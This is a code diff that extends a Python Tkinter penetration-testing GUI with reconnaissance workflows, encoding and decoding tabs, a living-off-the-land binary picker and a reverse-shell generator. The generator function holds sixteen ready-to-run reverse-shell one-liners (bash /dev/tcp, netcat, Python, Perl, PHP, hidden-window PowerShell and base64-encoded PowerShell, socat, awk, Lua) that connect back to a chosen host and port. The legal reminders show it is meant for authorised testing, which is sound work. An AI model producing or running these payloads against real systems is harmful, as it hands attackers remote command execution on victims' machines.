@@ -1606,6 +1606,108 @@ payload/                        # BLOCKED
 • May trigger IDS/IPS alerts
 • Document all activities
 • Get written permission first
+""",
+            "workflows": """
+WORKFLOWS CHEAT SHEET
+═══════════════════════════════════════════════════════════
+
+📋 AVAILABLE WORKFLOWS
+────────────────────────────────────────────────────────────
+1. 🎯 Full Network Reconnaissance
+   Target: IP address or network range
+   Steps: Nmap → Gobuster → Nikto → DNSrecon
+   Best for: Unknown networks, initial assessment
+
+2. 🌐 Web Application Deep Scan
+   Target: URL (http:// or https://)
+   Steps: Nikto → Gobuster → feroxbuster → Shodan
+   Best for: Web applications, API endpoints
+
+3. 📡 Domain Intelligence Gathering
+   Target: Domain name (e.g., example.com)
+   Steps: DNSrecon (std + brt) → Shodan → GitHarvester
+   Best for: Domain reconnaissance, OSINT
+
+4. 🖥️ Windows/SMB Enumeration
+   Target: IP address
+   Steps: Nmap (SMB) → enum4linux → Metasploit
+   Best for: Windows hosts, Active Directory
+
+5. ☁️ Cloud Asset Discovery
+   Target: Organization name
+   Steps: AWSBucketDump → GitHarvester → Shodan
+   Best for: Cloud security assessment
+
+6. ⚡ Quick Host Discovery
+   Target: IP address or hostname
+   Steps: Nmap (fast) → Nikto (quick)
+   Best for: Fast initial reconnaissance
+
+🎯 TARGET FORMATS
+────────────────────────────────────────────────────────────
+IP Address:       192.168.1.1
+Network Range:    192.168.1.0/24
+Domain:           example.com
+URL:              http://example.com
+Hostname:         server.local
+
+🔄 WORKFLOW EXECUTION
+────────────────────────────────────────────────────────────
+• Steps run sequentially
+• Conditional steps depend on previous results
+• HTTP detection enables web-based steps
+• Each step has individual timeout (30 min)
+• Total workflow timeout: 2 hours
+
+📊 PROGRESS TRACKING
+────────────────────────────────────────────────────────────
+• Real-time step counter
+• Progress bar percentage
+• Elapsed time display
+• Current tool indicator
+• Results in console output
+
+⏱️ TIMEOUTS
+────────────────────────────────────────────────────────────
+Per-step:    30 minutes
+Total:       2 hours
+Adjustable:  Yes (via Settings)
+
+💡 TIPS
+────────────────────────────────────────────────────────────
+• Start with Quick Host Discovery
+• Use Full Network Recon for thorough assessment
+• Web scans work best on web servers
+• Cloud scans need organization name
+• Results auto-saved to console
+• Export results with EXPORT button
+
+⚙️ CUSTOMIZATION
+────────────────────────────────────────────────────────────
+• Timeouts: Settings → Process Timeout
+• Threads: Settings → Default Threads
+• Output: Settings → Output Directory
+
+🔒 SECURITY
+────────────────────────────────────────────────────────────
+• All inputs validated
+• Command injection prevented
+• Process isolation
+• Clean termination
+• No shell=True
+
+📤 EXPORT
+────────────────────────────────────────────────────────────
+• Text (.txt)
+• JSON (.json)
+• XML (.xml)
+• HTML (.html)
+
+⚠️ LEGAL REMINDER
+────────────────────────────────────────────────────────────
+• Only scan authorized systems
+• Get written permission first
+• Document all activities
 """
         }
 
@@ -2001,13 +2103,18 @@ payload/                        # BLOCKED
             ("metasploit", "💥 Metasploit"),
             ("shodan", "🌐 Shodan"),
             ("dnsrecon", "📡 DNSrecon"),
-            ("enum4linux", "🖥️  enum4linux"),
+            ("enum4linux", "🖥️ enum4linux"),
             ("githarvester", "🔎 GitHub"),
             ("feroxbuster", "🦀 feroxbuster"),
-            ("awsbucket", "☁️  AWS S3"),
+            ("awsbucket", "☁️ AWS S3"),
             ("tcpdump", "📦 TCPdump"),
+            ("shellz", "🐚 Shellz"),
+            ("encoders", "🔐 Encoders"),
+            ("decoders", "🔓 Decoders"),
+            ("lolol", "🎭 LOLOL"),
             ("workflows", "🔄 Workflows"),
-            ("settings", "⚙️  Settings")
+            ("help", "❓ Help"),
+            ("settings", "⚙️ Settings")
         ]
 
         for tool_id, tool_name in tools:
@@ -2051,7 +2158,12 @@ payload/                        # BLOCKED
         self.tool_frames["feroxbuster"] = self.create_feroxbuster_tab()
         self.tool_frames["awsbucket"] = self.create_awsbucket_tab()
         self.tool_frames["tcpdump"] = self.create_tcpdump_tab()
-        self.tool_frames["workflows"] = self.create_workflows_tab()  # FIX: Was missing!
+        self.tool_frames["shellz"] = self.create_shellz_tab()
+        self.tool_frames["encoders"] = self.create_encoders_tab()
+        self.tool_frames["decoders"] = self.create_decoders_tab()
+        self.tool_frames["lolol"] = self.create_lolol_tab()
+        self.tool_frames["workflows"] = self.create_workflows_tab()
+        self.tool_frames["help"] = self.create_help_tab()
         self.tool_frames["settings"] = self.create_settings_tab()
 
         # Right panel - Output
@@ -2390,7 +2502,7 @@ payload/                        # BLOCKED
         browse_btn = tk.Button(wordlist_frame, text="📂", font=("Courier", 9),
                               bg=self.bg_primary, fg=self.text_color,
                               relief=tk.FLAT, cursor="hand2",
-                              command=self.browse_wordlist)
+                              command=lambda: self.browse_wordlist(self.gobuster_wordlist))
         browse_btn.pack(side=tk.RIGHT, padx=(5, 0))
 
         # Threads
@@ -2582,10 +2694,16 @@ payload/                        # BLOCKED
 
         return frame
 
-    def browse_wordlist(self):
+    def browse_wordlist(self, target_entry=None):
+        """Browse for wordlist file and update the specified entry widget."""
+        # Get default directory from config or use standard location
+        initial_dir = self.config.get("wordlist_path", "/usr/share/wordlists")
+        if not os.path.isdir(initial_dir):
+            initial_dir = "/usr/share/wordlists" if os.path.isdir("/usr/share/wordlists") else os.path.expanduser("~")
+
         filename = filedialog.askopenfilename(
             title="Select Wordlist",
-            initialdir="/usr/share/wordlists",
+            initialdir=initial_dir,
             filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
         )
         if filename:
@@ -2593,8 +2711,14 @@ payload/                        # BLOCKED
             if not self.validate_file_path(filename):
                 messagebox.showerror("Error", "Invalid file path selected")
                 return
-            self.gobuster_wordlist.delete(0, tk.END)
-            self.gobuster_wordlist.insert(0, filename)
+
+            # Determine which entry to update
+            if target_entry:
+                target_entry.delete(0, tk.END)
+                target_entry.insert(0, filename)
+            elif hasattr(self, 'gobuster_wordlist'):
+                self.gobuster_wordlist.delete(0, tk.END)
+                self.gobuster_wordlist.insert(0, filename)
 
     def create_shodan_tab(self):
         frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
@@ -2707,7 +2831,7 @@ payload/                        # BLOCKED
         browse_btn = tk.Button(wordlist_frame, text="📂", font=("Courier", 9),
                               bg=self.bg_primary, fg=self.text_color,
                               relief=tk.FLAT, cursor="hand2",
-                              command=self.browse_wordlist)
+                              command=lambda: self.browse_wordlist(self.dnsrecon_wordlist))
         browse_btn.pack(side=tk.RIGHT, padx=(5, 0))
 
         # Name server
@@ -2906,7 +3030,7 @@ payload/                        # BLOCKED
         browse_btn = tk.Button(wordlist_frame, text="📂", font=("Courier", 9),
                               bg=self.bg_primary, fg=self.text_color,
                               relief=tk.FLAT, cursor="hand2",
-                              command=self.browse_wordlist)
+                              command=lambda: self.browse_wordlist(self.ferox_wordlist))
         browse_btn.pack(side=tk.RIGHT, padx=(5, 0))
 
         # Extensions
@@ -2972,7 +3096,7 @@ payload/                        # BLOCKED
         browse_btn = tk.Button(bucketlist_frame, text="📂", font=("Courier", 9),
                               bg=self.bg_primary, fg=self.text_color,
                               relief=tk.FLAT, cursor="hand2",
-                              command=self.browse_wordlist)
+                              command=lambda: self.browse_wordlist(self.awsbucket_list))
         browse_btn.pack(side=tk.RIGHT, padx=(5, 0))
 
         # Grep wordlist (optional)
@@ -2992,7 +3116,7 @@ payload/                        # BLOCKED
         browse_btn2 = tk.Button(grep_frame, text="📂", font=("Courier", 9),
                                bg=self.bg_primary, fg=self.text_color,
                                relief=tk.FLAT, cursor="hand2",
-                               command=self.browse_wordlist)
+                               command=lambda: self.browse_wordlist(self.awsbucket_grep))
         browse_btn2.pack(side=tk.RIGHT, padx=(5, 0))
 
         # Download option
@@ -3039,6 +3163,35 @@ payload/                        # BLOCKED
 
         return frame
 
+    def get_network_interfaces(self):
+        """Get list of available network interfaces."""
+        interfaces = ["eth0", "wlan0", "lo", "any"]  # Default common interfaces
+        try:
+            # Try to get actual interfaces from /sys/class/net
+            net_path = "/sys/class/net"
+            if os.path.isdir(net_path):
+                actual_interfaces = os.listdir(net_path)
+                # Filter out unwanted interfaces and sort
+                filtered = [iface for iface in actual_interfaces if iface and not iface.startswith('.')]
+                if filtered:
+                    interfaces = sorted(filtered) + ["any"]
+        except Exception:
+            pass
+        return interfaces
+
+    def refresh_interfaces(self):
+        """Refresh the list of network interfaces in the TCPDump dropdown."""
+        if hasattr(self, 'tcpdump_interface'):
+            current = self.tcpdump_interface.get()
+            interfaces = self.get_network_interfaces()
+            self.tcpdump_interface['values'] = interfaces
+            # Restore current selection if still valid
+            if current in interfaces:
+                self.tcpdump_interface.set(current)
+            elif interfaces:
+                self.tcpdump_interface.current(0)
+            self.update_status("Network interfaces refreshed")
+
     def create_tcpdump_tab(self):
         frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
         frame.columnconfigure(1, weight=1)
@@ -3054,8 +3207,28 @@ payload/                        # BLOCKED
         )
         warning_label.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=10)
 
-        # Interface
-        self.tcpdump_interface = self.create_labeled_entry(frame, "Interface:", 1, "eth0")
+        # Interface - Dropdown with available interfaces
+        label = tk.Label(frame, text="Interface:", font=("Courier", 10),
+                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        label.grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)
+
+        interface_frame = tk.Frame(frame, bg=self.bg_secondary)
+        interface_frame.grid(row=1, column=1, sticky=tk.EW, padx=10, pady=5)
+        interface_frame.columnconfigure(0, weight=1)
+
+        interfaces = self.get_network_interfaces()
+        self.tcpdump_interface = ttk.Combobox(interface_frame, values=interfaces,
+                                             font=("Courier", 10), state="readonly", width=20)
+        self.tcpdump_interface.pack(side=tk.LEFT, fill=tk.X, expand=True)
+        if interfaces:
+            self.tcpdump_interface.current(0)
+
+        # Refresh button to reload interfaces
+        refresh_btn = tk.Button(interface_frame, text="🔄", font=("Courier", 9),
+                               bg=self.bg_primary, fg=self.text_color,
+                               relief=tk.FLAT, cursor="hand2",
+                               command=self.refresh_interfaces)
+        refresh_btn.pack(side=tk.RIGHT, padx=(5, 0))
 
         # Capture filter
         self.tcpdump_filter = self.create_labeled_entry(frame, "BPF Filter:", 2, "port 80")
@@ -3107,6 +3280,820 @@ payload/                        # BLOCKED
 
         return frame
 
+    def create_shellz_tab(self):
+        """Create the Shellz tab for reverse shell generation."""
+        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
+        frame.columnconfigure(1, weight=1)
+
+        # Header
+        header = tk.Label(
+            frame,
+            text="🐚 REVERSE SHELL GENERATOR",
+            font=("Courier", 14, "bold"),
+            fg=self.accent_cyan,
+            bg=self.bg_secondary
+        )
+        header.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=15)
+
+        # IP Address
+        self.shellz_ip = self.create_labeled_entry(frame, "LHOST (Your IP):", 1, "")
+
+        # Port
+        self.shellz_port = self.create_labeled_entry(frame, "LPORT:", 2, "4444")
+
+        # Shell type dropdown
+        label = tk.Label(frame, text="Shell Type:", font=("Courier", 10),
+                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        label.grid(row=3, column=0, sticky=tk.W, padx=10, pady=5)
+
+        self.shellz_type = ttk.Combobox(frame, values=[
+            "Bash TCP",
+            "Bash UDP",
+            "Netcat Traditional",
+            "Netcat OpenBSD",
+            "Netcat BusyBox",
+            "Python",
+            "Python3",
+            "Perl",
+            "PHP",
+            "Ruby",
+            "Java",
+            "PowerShell",
+            "PowerShell Base64",
+            "Socat",
+            "Awk",
+            "Lua"
+        ], font=("Courier", 10), state="readonly", width=25)
+        self.shellz_type.grid(row=3, column=1, sticky=tk.W, padx=10, pady=5)
+        self.shellz_type.current(0)
+
+        # Generate button
+        gen_btn = tk.Button(
+            frame,
+            text="⚡ GENERATE SHELL",
+            font=("Courier", 11, "bold"),
+            bg=self.accent_green,
+            fg=self.bg_primary,
+            activebackground=self.accent_cyan,
+            relief=tk.FLAT,
+            padx=20,
+            pady=10,
+            cursor="hand2",
+            command=self.generate_reverse_shell
+        )
+        gen_btn.grid(row=4, column=0, columnspan=2, padx=10, pady=15)
+
+        # Output area
+        output_label = tk.Label(frame, text="Generated Shell:", font=("Courier", 10, "bold"),
+                               fg=self.accent_cyan, bg=self.bg_secondary)
+        output_label.grid(row=5, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(10, 5))
+
+        self.shellz_output = scrolledtext.ScrolledText(
+            frame, height=8, font=("Courier", 10),
+            bg=self.bg_primary, fg=self.accent_green,
+            insertbackground=self.accent_green,
+            wrap=tk.WORD
+        )
+        self.shellz_output.grid(row=6, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)
+
+        # Copy button
+        copy_btn = tk.Button(
+            frame,
+            text="📋 COPY TO CLIPBOARD",
+            font=("Courier", 9, "bold"),
+            bg=self.bg_tertiary,
+            fg=self.accent_cyan,
+            activebackground=self.accent_cyan,
+            activeforeground=self.bg_primary,
+            relief=tk.FLAT,
+            padx=15,
+            pady=8,
+            cursor="hand2",
+            command=lambda: self.copy_to_clipboard(self.shellz_output.get("1.0", tk.END))
+        )
+        copy_btn.grid(row=7, column=0, columnspan=2, pady=10)
+
+        return frame
+
+    def generate_reverse_shell(self):
+        """Generate a reverse shell based on selected parameters."""
+        ip = self.shellz_ip.get().strip()
+        port = self.shellz_port.get().strip()
+        shell_type = self.shellz_type.get()
+
+        if not ip or not port:
+            messagebox.showerror("Error", "Please enter IP address and port")
+            return
+
+        shells = {
+            "Bash TCP": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+            "Bash UDP": f"bash -i >& /dev/udp/{ip}/{port} 0>&1",
+            "Netcat Traditional": f"nc -e /bin/bash {ip} {port}",
+            "Netcat OpenBSD": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
+            "Netcat BusyBox": f"rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
+            "Python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+            "Python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+            "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
+            "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+            "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+            "Java": f"Runtime r = Runtime.getRuntime();\nProcess p = r.exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\");\np.waitFor();",
+            "PowerShell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
+            "PowerShell Base64": self.generate_ps_base64(ip, port),
+            "Socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
+            "Awk": f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null",
+            "Lua": f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
+        }
+
+        shell_cmd = shells.get(shell_type, "")
+        self.shellz_output.delete("1.0", tk.END)
+        self.shellz_output.insert("1.0", shell_cmd)
+
+    def generate_ps_base64(self, ip, port):
+        """Generate Base64 encoded PowerShell reverse shell."""
+        import base64
+        ps_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
+        encoded = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
+        return f"powershell -e {encoded}"
+
+    def copy_to_clipboard(self, text):
+        """Copy text to clipboard."""
+        self.root.clipboard_clear()
+        self.root.clipboard_append(text.strip())
+        self.update_status("Copied to clipboard")
+
+    def create_encoders_tab(self):
+        """Create the Encoders tab for encoding data."""
+        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
+        frame.columnconfigure(1, weight=1)
+
+        # Header
+        header = tk.Label(
+            frame,
+            text="🔐 ENCODERS",
+            font=("Courier", 14, "bold"),
+            fg=self.accent_cyan,
+            bg=self.bg_secondary
+        )
+        header.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=15)
+
+        # Encoding type
+        label = tk.Label(frame, text="Encoding Type:", font=("Courier", 10),
+                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        label.grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)
+
+        self.encoder_type = ttk.Combobox(frame, values=[
+            "Base64",
+            "URL Encode",
+            "HTML Entities",
+            "Hex",
+            "Binary",
+            "ROT13",
+            "Unicode",
+            "ASCII to Decimal",
+            "MD5 Hash",
+            "SHA1 Hash",
+            "SHA256 Hash"
+        ], font=("Courier", 10), state="readonly", width=25)
+        self.encoder_type.grid(row=1, column=1, sticky=tk.W, padx=10, pady=5)
+        self.encoder_type.current(0)
+
+        # Input
+        input_label = tk.Label(frame, text="Input Text:", font=("Courier", 10, "bold"),
+                              fg=self.accent_cyan, bg=self.bg_secondary)
+        input_label.grid(row=2, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(10, 5))
+
+        self.encoder_input = scrolledtext.ScrolledText(
+            frame, height=5, font=("Courier", 10),
+            bg=self.bg_primary, fg=self.text_color,
+            insertbackground=self.accent_cyan,
+            wrap=tk.WORD
+        )
+        self.encoder_input.grid(row=3, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)
+
+        # Encode button
+        encode_btn = tk.Button(
+            frame,
+            text="⚡ ENCODE",
+            font=("Courier", 11, "bold"),
+            bg=self.accent_green,
+            fg=self.bg_primary,
+            activebackground=self.accent_cyan,
+            relief=tk.FLAT,
+            padx=20,
+            pady=10,
+            cursor="hand2",
+            command=self.encode_text
+        )
+        encode_btn.grid(row=4, column=0, columnspan=2, padx=10, pady=15)
+
+        # Output
+        output_label = tk.Label(frame, text="Encoded Output:", font=("Courier", 10, "bold"),
+                               fg=self.accent_cyan, bg=self.bg_secondary)
+        output_label.grid(row=5, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(10, 5))
+
+        self.encoder_output = scrolledtext.ScrolledText(
+            frame, height=5, font=("Courier", 10),
+            bg=self.bg_primary, fg=self.accent_green,
+            insertbackground=self.accent_green,
+            wrap=tk.WORD
+        )
+        self.encoder_output.grid(row=6, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)
+
+        # Copy button
+        copy_btn = tk.Button(
+            frame,
+            text="📋 COPY TO CLIPBOARD",
+            font=("Courier", 9, "bold"),
+            bg=self.bg_tertiary,
+            fg=self.accent_cyan,
+            activebackground=self.accent_cyan,
+            activeforeground=self.bg_primary,
+            relief=tk.FLAT,
+            padx=15,
+            pady=8,
+            cursor="hand2",
+            command=lambda: self.copy_to_clipboard(self.encoder_output.get("1.0", tk.END))
+        )
+        copy_btn.grid(row=7, column=0, columnspan=2, pady=10)
+
+        return frame
+
+    def encode_text(self):
+        """Encode text based on selected encoding type."""
+        import base64
+        import hashlib
+        import urllib.parse
+        import html
+        import codecs
+
+        text = self.encoder_input.get("1.0", tk.END).strip()
+        enc_type = self.encoder_type.get()
+
+        if not text:
+            messagebox.showerror("Error", "Please enter text to encode")
+            return
+
+        try:
+            if enc_type == "Base64":
+                result = base64.b64encode(text.encode()).decode()
+            elif enc_type == "URL Encode":
+                result = urllib.parse.quote(text)
+            elif enc_type == "HTML Entities":
+                result = html.escape(text)
+            elif enc_type == "Hex":
+                result = text.encode().hex()
+            elif enc_type == "Binary":
+                result = ' '.join(format(ord(c), '08b') for c in text)
+            elif enc_type == "ROT13":
+                result = codecs.encode(text, 'rot_13')
+            elif enc_type == "Unicode":
+                result = ''.join(f'\\u{ord(c):04x}' for c in text)
+            elif enc_type == "ASCII to Decimal":
+                result = ' '.join(str(ord(c)) for c in text)
+            elif enc_type == "MD5 Hash":
+                result = hashlib.md5(text.encode()).hexdigest()
+            elif enc_type == "SHA1 Hash":
+                result = hashlib.sha1(text.encode()).hexdigest()
+            elif enc_type == "SHA256 Hash":
+                result = hashlib.sha256(text.encode()).hexdigest()
+            else:
+                result = text
+
+            self.encoder_output.delete("1.0", tk.END)
+            self.encoder_output.insert("1.0", result)
+        except Exception as e:
+            messagebox.showerror("Encoding Error", str(e))
+
+    def create_decoders_tab(self):
+        """Create the Decoders tab for decoding data."""
+        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
+        frame.columnconfigure(1, weight=1)
+
+        # Header
+        header = tk.Label(
+            frame,
+            text="🔓 DECODERS",
+            font=("Courier", 14, "bold"),
+            fg=self.accent_cyan,
+            bg=self.bg_secondary
+        )
+        header.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=15)
+
+        # Decoding type
+        label = tk.Label(frame, text="Decoding Type:", font=("Courier", 10),
+                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        label.grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)
+
+        self.decoder_type = ttk.Combobox(frame, values=[
+            "Base64",
+            "URL Decode",
+            "HTML Entities",
+            "Hex",
+            "Binary",
+            "ROT13",
+            "Unicode",
+            "Decimal to ASCII",
+            "JWT Decode"
+        ], font=("Courier", 10), state="readonly", width=25)
+        self.decoder_type.grid(row=1, column=1, sticky=tk.W, padx=10, pady=5)
+        self.decoder_type.current(0)
+
+        # Input
+        input_label = tk.Label(frame, text="Encoded Input:", font=("Courier", 10, "bold"),
+                              fg=self.accent_cyan, bg=self.bg_secondary)
+        input_label.grid(row=2, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(10, 5))
+
+        self.decoder_input = scrolledtext.ScrolledText(
+            frame, height=5, font=("Courier", 10),
+            bg=self.bg_primary, fg=self.text_color,
+            insertbackground=self.accent_cyan,
+            wrap=tk.WORD
+        )
+        self.decoder_input.grid(row=3, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)
+
+        # Decode button
+        decode_btn = tk.Button(
+            frame,
+            text="⚡ DECODE",
+            font=("Courier", 11, "bold"),
+            bg=self.accent_green,
+            fg=self.bg_primary,
+            activebackground=self.accent_cyan,
+            relief=tk.FLAT,
+            padx=20,
+            pady=10,
+            cursor="hand2",
+            command=self.decode_text
+        )
+        decode_btn.grid(row=4, column=0, columnspan=2, padx=10, pady=15)
+
+        # Output
+        output_label = tk.Label(frame, text="Decoded Output:", font=("Courier", 10, "bold"),
+                               fg=self.accent_cyan, bg=self.bg_secondary)
+        output_label.grid(row=5, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(10, 5))
+
+        self.decoder_output = scrolledtext.ScrolledText(
+            frame, height=5, font=("Courier", 10),
+            bg=self.bg_primary, fg=self.accent_green,
+            insertbackground=self.accent_green,
+            wrap=tk.WORD
+        )
+        self.decoder_output.grid(row=6, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)
+
+        # Copy button
+        copy_btn = tk.Button(
+            frame,
+            text="📋 COPY TO CLIPBOARD",
+            font=("Courier", 9, "bold"),
+            bg=self.bg_tertiary,
+            fg=self.accent_cyan,
+            activebackground=self.accent_cyan,
+            activeforeground=self.bg_primary,
+            relief=tk.FLAT,
+            padx=15,
+            pady=8,
+            cursor="hand2",
+            command=lambda: self.copy_to_clipboard(self.decoder_output.get("1.0", tk.END))
+        )
+        copy_btn.grid(row=7, column=0, columnspan=2, pady=10)
+
+        return frame
+
+    def decode_text(self):
+        """Decode text based on selected decoding type."""
+        import base64
+        import urllib.parse
+        import html
+        import codecs
+
+        text = self.decoder_input.get("1.0", tk.END).strip()
+        dec_type = self.decoder_type.get()
+
+        if not text:
+            messagebox.showerror("Error", "Please enter text to decode")
+            return
+
+        try:
+            if dec_type == "Base64":
+                result = base64.b64decode(text).decode()
+            elif dec_type == "URL Decode":
+                result = urllib.parse.unquote(text)
+            elif dec_type == "HTML Entities":
+                result = html.unescape(text)
+            elif dec_type == "Hex":
+                result = bytes.fromhex(text).decode()
+            elif dec_type == "Binary":
+                binary_values = text.split()
+                result = ''.join(chr(int(b, 2)) for b in binary_values)
+            elif dec_type == "ROT13":
+                result = codecs.decode(text, 'rot_13')
+            elif dec_type == "Unicode":
+                result = text.encode().decode('unicode_escape')
+            elif dec_type == "Decimal to ASCII":
+                decimal_values = text.split()
+                result = ''.join(chr(int(d)) for d in decimal_values)
+            elif dec_type == "JWT Decode":
+                result = self.decode_jwt(text)
+            else:
+                result = text
+
+            self.decoder_output.delete("1.0", tk.END)
+            self.decoder_output.insert("1.0", result)
+        except Exception as e:
+            messagebox.showerror("Decoding Error", str(e))
+
+    def decode_jwt(self, token):
+        """Decode a JWT token."""
+        import base64
+        import json
+
+        parts = token.split('.')
+        if len(parts) != 3:
+            return "Invalid JWT format"
+
+        def decode_part(part):
+            padding = 4 - len(part) % 4
+            part += '=' * padding
+            return base64.urlsafe_b64decode(part).decode()
+
+        header = json.loads(decode_part(parts[0]))
+        payload = json.loads(decode_part(parts[1]))
+
+        return f"HEADER:\n{json.dumps(header, indent=2)}\n\nPAYLOAD:\n{json.dumps(payload, indent=2)}"
+
+    def create_lolol_tab(self):
+        """Create the LOLOL tab for Living Off The Land binaries reference."""
+        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
+        frame.columnconfigure(1, weight=1)
+        frame.rowconfigure(4, weight=1)
+
+        # Header
+        header = tk.Label(
+            frame,
+            text="🎭 LOLOL - Living Off The Land",
+            font=("Courier", 14, "bold"),
+            fg=self.accent_cyan,
+            bg=self.bg_secondary
+        )
+        header.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=15)
+
+        desc = tk.Label(
+            frame,
+            text="GTFOBins-style reference for Linux binaries",
+            font=("Courier", 9),
+            fg=self.text_color,
+            bg=self.bg_secondary
+        )
+        desc.grid(row=1, column=0, columnspan=2, padx=10, pady=(0, 10))
+
+        # Binary selection
+        label = tk.Label(frame, text="Select Binary:", font=("Courier", 10),
+                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        label.grid(row=2, column=0, sticky=tk.W, padx=10, pady=5)
+
+        self.lolol_binaries = [
+            "awk", "base64", "bash", "busybox", "cat", "chmod", "cp", "curl",
+            "cut", "date", "dd", "diff", "dmesg", "docker", "ed", "env",
+            "expand", "expect", "find", "ftp", "gdb", "git", "grep", "head",
+            "ip", "jq", "less", "lua", "make", "more", "mv", "nano", "nc",
+            "nmap", "node", "perl", "php", "pip", "python", "python3",
+            "readelf", "rlwrap", "rsync", "ruby", "scp", "sed", "socat",
+            "ssh", "strace", "tail", "tar", "tee", "vim", "watch", "wget",
+            "xargs", "xxd", "zip"
+        ]
+
+        self.lolol_binary = ttk.Combobox(frame, values=self.lolol_binaries,
+                                         font=("Courier", 10), state="readonly", width=25)
+        self.lolol_binary.grid(row=2, column=1, sticky=tk.W, padx=10, pady=5)
+        self.lolol_binary.current(0)
+        self.lolol_binary.bind("<<ComboboxSelected>>", lambda e: self.show_lolol_info())
+
+        # Function type
+        label = tk.Label(frame, text="Function:", font=("Courier", 10),
+                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        label.grid(row=3, column=0, sticky=tk.W, padx=10, pady=5)
+
+        self.lolol_function = ttk.Combobox(frame, values=[
+            "Shell", "File read", "File write", "SUID", "Sudo",
+            "Reverse shell", "File upload", "File download"
+        ], font=("Courier", 10), state="readonly", width=25)
+        self.lolol_function.grid(row=3, column=1, sticky=tk.W, padx=10, pady=5)
+        self.lolol_function.current(0)
+        self.lolol_function.bind("<<ComboboxSelected>>", lambda e: self.show_lolol_info())
+
+        # Info display
+        self.lolol_output = scrolledtext.ScrolledText(
+            frame, height=12, font=("Courier", 10),
+            bg=self.bg_primary, fg=self.accent_green,
+            insertbackground=self.accent_green,
+            wrap=tk.WORD
+        )
+        self.lolol_output.grid(row=4, column=0, columnspan=2, sticky=tk.NSEW, padx=10, pady=10)
+
+        # Show initial info
+        self.show_lolol_info()
